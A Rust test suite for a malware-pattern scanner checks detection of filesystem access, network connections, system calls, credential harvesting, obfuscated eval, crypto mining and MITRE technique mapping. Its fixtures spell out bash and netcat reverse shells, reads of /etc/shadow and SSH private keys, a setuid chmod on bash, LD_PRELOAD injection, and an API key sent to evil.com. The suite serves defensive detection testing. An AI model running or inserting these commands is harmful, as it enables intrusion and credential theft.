use opensentinel::advisory::mitre::MitreMappingEngine;
use opensentinel::analyzer::behavioral::BehavioralAnalyzer;
use opensentinel::analyzer::credential::CredentialHarvestingDetector;
use opensentinel::database::models::PatternType;
use std::fs::File;
use std::io::Write;
use tempfile::TempDir;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn write_file(dir: &TempDir, name: &str, content: &str) {
    let path = dir.path().join(name);
    let mut f = File::create(path).unwrap();
    writeln!(f, "{content}").unwrap();
}

fn has_pattern(detections: &[opensentinel::analyzer::models::DetectionMatch], kind: &PatternType) -> bool {
    detections.iter().any(|d| &d.pattern_type == kind)
}

fn max_confidence(
    detections: &[opensentinel::analyzer::models::DetectionMatch],
    kind: &PatternType,
) -> f32 {
    detections
        .iter()
        .filter(|d| &d.pattern_type == kind)
        .map(|d| d.confidence)
        .fold(0.0_f32, f32::max)
}

// ---------------------------------------------------------------------------
// FilesystemAccess
// ---------------------------------------------------------------------------

#[test]
fn detects_etc_passwd_json_roundtrip() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "spy.js", "const data = fs.readFileSync('/etc/passwd', 'utf8');");

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    assert!(has_pattern(&detections, &PatternType::FilesystemAccess));
    assert!(max_confidence(&detections, &PatternType::FilesystemAccess) >= 0.90);

    // JSON roundtrip — the field must survive serde
    let json = serde_json::to_string_pretty(&detections).unwrap();
    let parsed: Vec<opensentinel::analyzer::models::DetectionMatch> =
        serde_json::from_str(&json).unwrap();
    assert!(has_pattern(&parsed, &PatternType::FilesystemAccess));
}

#[test]
fn detects_etc_shadow_access() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "exfil.py", "open('/etc/shadow', 'r').read()");

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    assert!(has_pattern(&detections, &PatternType::FilesystemAccess));
    assert!(max_confidence(&detections, &PatternType::FilesystemAccess) >= 0.90);
}

#[test]
fn detects_ssh_directory_access() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "stealer.sh", "cat ~/.ssh/id_rsa");

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    assert!(has_pattern(&detections, &PatternType::FilesystemAccess));
    assert!(max_confidence(&detections, &PatternType::FilesystemAccess) >= 0.85);
}

#[test]
fn detects_proc_self_environ() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "probe.go", r#"os.Open("/proc/self/environ")"#);

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    assert!(has_pattern(&detections, &PatternType::FilesystemAccess));
}

#[test]
fn filesystem_detection_includes_file_and_line() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "leak.js", "const x = fs.readFileSync('/etc/passwd');");

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    let hit = detections
        .iter()
        .find(|d| d.pattern_type == PatternType::FilesystemAccess)
        .unwrap();

    assert!(hit.file_path.as_deref().unwrap_or("").ends_with("leak.js"));
    assert_eq!(hit.line_number, Some(1));
    assert!(hit.code_snippet.is_some());
}

// ---------------------------------------------------------------------------
// NetworkConnection
// ---------------------------------------------------------------------------

#[test]
fn detects_reverse_shell_bash_tcp() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "backdoor.sh", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    assert!(has_pattern(&detections, &PatternType::NetworkConnection));
    assert!(max_confidence(&detections, &PatternType::NetworkConnection) >= 0.95);
}

#[test]
fn detects_netcat_reverse_shell() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "nc_shell.sh", "nc -e /bin/bash 10.0.0.1 4444");

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    assert!(has_pattern(&detections, &PatternType::NetworkConnection));
    assert!(max_confidence(&detections, &PatternType::NetworkConnection) >= 0.95);
}

#[test]
fn detects_dns_lookup() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "ping.js", "dns.lookup('evil.com', (err, addr) => {});");

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    assert!(has_pattern(&detections, &PatternType::NetworkConnection));
}

#[test]
fn detects_suspicious_port() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "irc.js", r#"socket.connect(6667, 'irc.evil.com');"#);

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    assert!(has_pattern(&detections, &PatternType::NetworkConnection));
}

#[test]
fn network_detection_json_roundtrip() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "shell.sh", "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1");

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    let json = serde_json::to_string_pretty(&detections).unwrap();
    assert!(json.contains("NetworkConnection") || json.contains("network_connection"));

    let parsed: Vec<opensentinel::analyzer::models::DetectionMatch> =
        serde_json::from_str(&json).unwrap();
    assert!(has_pattern(&parsed, &PatternType::NetworkConnection));
}

// ---------------------------------------------------------------------------
// SystemCall
// ---------------------------------------------------------------------------

#[test]
fn detects_privilege_escalation_chmod() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "escalate.sh", "sudo chmod 4000 /bin/bash");

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    assert!(has_pattern(&detections, &PatternType::SystemCall));
    assert!(max_confidence(&detections, &PatternType::SystemCall) >= 0.85);
}

#[test]
fn detects_execve_bash() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "exec.c", r#"execve("/bin/bash", args, envp);"#);

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    assert!(has_pattern(&detections, &PatternType::SystemCall));
    assert!(max_confidence(&detections, &PatternType::SystemCall) >= 0.90);
}

#[test]
fn detects_ld_preload_injection() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "inject.sh", r#"export LD_PRELOAD=/tmp/evil.so"#);

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    assert!(has_pattern(&detections, &PatternType::SystemCall));
    assert!(max_confidence(&detections, &PatternType::SystemCall) >= 0.85);
}

#[test]
fn detects_ptrace_call() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "tracer.c", "ptrace(PTRACE_ATTACH, pid, NULL, NULL);");

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    assert!(has_pattern(&detections, &PatternType::SystemCall));
    assert!(max_confidence(&detections, &PatternType::SystemCall) >= 0.90);
}

#[test]
fn syscall_detection_json_roundtrip() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "privesc.sh", "sudo chmod 4000 /bin/bash");

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    let json = serde_json::to_string_pretty(&detections).unwrap();
    assert!(json.contains("SystemCall") || json.contains("system_call"));

    let parsed: Vec<opensentinel::analyzer::models::DetectionMatch> =
        serde_json::from_str(&json).unwrap();
    assert!(has_pattern(&parsed, &PatternType::SystemCall));
}

// ---------------------------------------------------------------------------
// End-to-end: todos los tipos en un mismo escaneo → output JSON
// ---------------------------------------------------------------------------

#[test]
fn end_to_end_all_pattern_types_appear_in_json() {
    let dir = TempDir::new().unwrap();

    // FilesystemAccess
    write_file(&dir, "fs.js", "fs.readFileSync('/etc/passwd', 'utf8');");
    // NetworkConnection
    write_file(&dir, "net.sh", "bash -i >& /dev/tcp/10.10.0.1/4444 0>&1");
    // SystemCall
    write_file(&dir, "sys.sh", "sudo chmod 4000 /bin/bash");

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    assert!(has_pattern(&detections, &PatternType::FilesystemAccess), "missing FilesystemAccess");
    assert!(has_pattern(&detections, &PatternType::NetworkConnection), "missing NetworkConnection");
    assert!(has_pattern(&detections, &PatternType::SystemCall), "missing SystemCall");

    // Todos caben en un array JSON válido
    let json = serde_json::to_string_pretty(&detections).unwrap();
    assert!(json.starts_with('['));

    // El JSON incluye file_path y line_number para cada detección
    let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
    for item in parsed.as_array().unwrap() {
        assert!(item.get("file_path").is_some(), "missing file_path in {item}");
        assert!(item.get("line_number").is_some(), "missing line_number in {item}");
        assert!(item.get("confidence").is_some(), "missing confidence in {item}");
    }
}

#[test]
fn end_to_end_confidence_scores_within_bounds() {
    let dir = TempDir::new().unwrap();
    write_file(&dir, "fs.js", "fs.readFileSync('/etc/passwd');");
    write_file(&dir, "net.sh", "bash -i >& /dev/tcp/10.0.0.1/4444");
    write_file(&dir, "sys.sh", "sudo chmod 4000 /bin/bash");

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();

    for d in &detections {
        assert!(
            d.confidence > 0.0 && d.confidence <= 1.0,
            "confidence {} out of (0, 1] for {:?}",
            d.confidence,
            d.pattern_type
        );
    }
}

// ---------------------------------------------------------------------------
// Falsos positivos — archivos normales no deben generar high-confidence hits
// ---------------------------------------------------------------------------

#[test]
fn no_false_positives_on_normal_js() {
    let dir = TempDir::new().unwrap();
    write_file(
        &dir,
        "app.js",
        r#"
const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('Hello World'));
app.listen(3000);
"#,
    );

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();
    let high_conf: Vec<_> = detections.iter().filter(|d| d.confidence > 0.75).collect();
    assert!(
        high_conf.is_empty(),
        "unexpected high-confidence detections: {high_conf:#?}"
    );
}

#[test]
fn no_false_positives_on_normal_python() {
    let dir = TempDir::new().unwrap();
    write_file(
        &dir,
        "server.py",
        r#"
import os
import json

config_path = os.path.join(os.getcwd(), 'config.json')
with open(config_path) as f:
    config = json.load(f)
print(config)
"#,
    );

    let detections = BehavioralAnalyzer::scan_directory(dir.path()).unwrap();
    let high_conf: Vec<_> = detections.iter().filter(|d| d.confidence > 0.75).collect();
    assert!(
        high_conf.is_empty(),
        "unexpected high-confidence detections: {high_conf:#?}"
    );
}

// ---------------------------------------------------------------------------
// Regresión: credential / crypto / exfil patterns siguen funcionando
// ---------------------------------------------------------------------------

#[tokio::test]
async fn regression_credential_harvesting_still_detected() {
    let dir = TempDir::new().unwrap();
    write_file(
        &dir,
        "exfil.js",
        r#"const key = process.env["API_KEY"]; fetch('https://evil.com', { body: key });"#,
    );

    let detections = CredentialHarvestingDetector::scan_directory(dir.path())
        .await
        .unwrap();

    assert!(
        !detections.is_empty(),
        "credential harvesting detector returned nothing"
    );
    assert!(
        detections
            .iter()
            .any(|d| d.pattern_type == PatternType::CredentialHarvesting
                || d.pattern_type == PatternType::NetworkExfiltration),
        "expected CredentialHarvesting or NetworkExfiltration, got: {detections:#?}"
    );
}

#[tokio::test]
async fn regression_hardcoded_secret_still_detected() {
    let dir = TempDir::new().unwrap();
    write_file(
        &dir,
        "config.js",
        r#"const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9abcdefghijklmnopqrstuvwxyz";"#,
    );

    let detections = CredentialHarvestingDetector::scan_directory(dir.path())
        .await
        .unwrap();

    assert!(
        !detections.is_empty(),
        "hardcoded secret not detected"
    );
}

#[tokio::test]
async fn regression_obfuscated_eval_still_detected() {
    let dir = TempDir::new().unwrap();
    write_file(
        &dir,
        "malware.js",
        r#"eval(Buffer.from("Y29uc29sZS5sb2coJ2hpJyk=", "base64").toString());"#,
    );

    let detections = CredentialHarvestingDetector::scan_directory_with_ast(dir.path())
        .await
        .unwrap();

    assert!(
        !detections.is_empty(),
        "obfuscated eval not detected"
    );
    assert!(
        detections.iter().any(|d| d.pattern_type == PatternType::ObfuscatedCode),
        "expected ObfuscatedCode, got: {detections:#?}"
    );
}

#[tokio::test]
async fn regression_crypto_mining_still_detected() {
    let dir = TempDir::new().unwrap();
    write_file(
        &dir,
        "miner.js",
        r#"const conn = new WebSocket("stratum+tcp://pool.minexmr.com:4444");"#,
    );

    let detections = CredentialHarvestingDetector::scan_directory(dir.path())
        .await
        .unwrap();

    assert!(
        !detections.is_empty(),
        "crypto mining pattern not detected"
    );
    assert!(
        detections.iter().any(|d| d.pattern_type == PatternType::CryptoMining),
        "expected CryptoMining, got: {detections:#?}"
    );
}

// ---------------------------------------------------------------------------
// MITRE mappings — los tres nuevos PatternType tienen técnicas asignadas
// ---------------------------------------------------------------------------

#[test]
fn mitre_filesystem_access_has_mappings() {
    let mappings = MitreMappingEngine::map_pattern(&PatternType::FilesystemAccess);

    assert!(!mappings.is_empty());
    assert!(mappings.iter().any(|m| m.technique_id == "T1005"));
    assert!(mappings.iter().any(|m| m.technique_id == "T1083"));
}

#[test]
fn mitre_network_connection_has_mappings() {
    let mappings = MitreMappingEngine::map_pattern(&PatternType::NetworkConnection);

    assert!(!mappings.is_empty());
    assert!(mappings.iter().any(|m| m.technique_id == "T1071"));
    assert!(mappings.iter().any(|m| m.technique_id == "T1095"));
}

#[test]
fn mitre_system_call_has_mappings() {
    let mappings = MitreMappingEngine::map_pattern(&PatternType::SystemCall);

    assert!(!mappings.is_empty());
    assert!(mappings.iter().any(|m| m.technique_id == "T1059"));
    assert!(mappings.iter().any(|m| m.technique_id == "T1106"));
}

#[test]
fn mitre_all_pattern_types_are_covered() {
    let types = [
        PatternType::CredentialHarvesting,
        PatternType::CryptoMining,
        PatternType::NetworkExfiltration,
        PatternType::InstallHook,
        PatternType::Typosquatting,
        PatternType::ObfuscatedCode,
        PatternType::ReverseshellCode,
        PatternType::FilesystemAccess,
        PatternType::NetworkConnection,
        PatternType::SystemCall,
    ];

    for pt in &types {
        let mappings = MitreMappingEngine::map_pattern(pt);
        assert!(
            !mappings.is_empty(),
            "PatternType::{pt:?} has no MITRE mappings"
        );
    }
}
